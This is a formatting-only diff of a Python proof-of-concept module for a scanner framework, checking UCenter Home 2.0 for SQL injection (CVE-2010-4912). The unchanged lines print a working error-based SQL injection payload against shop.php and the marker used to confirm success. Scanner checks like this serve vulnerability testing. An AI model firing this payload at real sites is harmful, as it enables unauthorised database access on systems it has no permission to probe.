@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'UCenter_0001' # 平台漏洞编号，留空
+    vuln_id = 'UCenter_0001'  # 平台漏洞编号，留空
     name = 'UCenter Home 2.0 SQL注入漏洞'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = ' 2010-09-13'  # 漏洞公布时间
     desc = '''
         Script HomePage : http://u.discuz.net/
@@ -21,6 +22,7 @@ class Vuln(ABVuln):
     cve_id = 'CVE-2010-4912'  # cve编号
     product = 'UCenter'  # 漏洞应用名称
     product_version = 'UCenter Home 2.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '87bcd08f-0d05-4979-8b24-a5487ba048c3'
@@ -34,7 +36,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = ("/shop.php?ac=view&shopid=253 AND (SELECT 4650 FROM(SELECT COUNT(*),"
                        "CONCAT(0x716b6a6271,(SELECT (CASE WHEN (4650=4650) THEN 1 ELSE 0 END)),"
                        "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
@@ -42,14 +44,15 @@ class Poc(ABPoc):
 
             content = requests.get(verify_url).content
             if 'qkjbq1qxxpq1' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
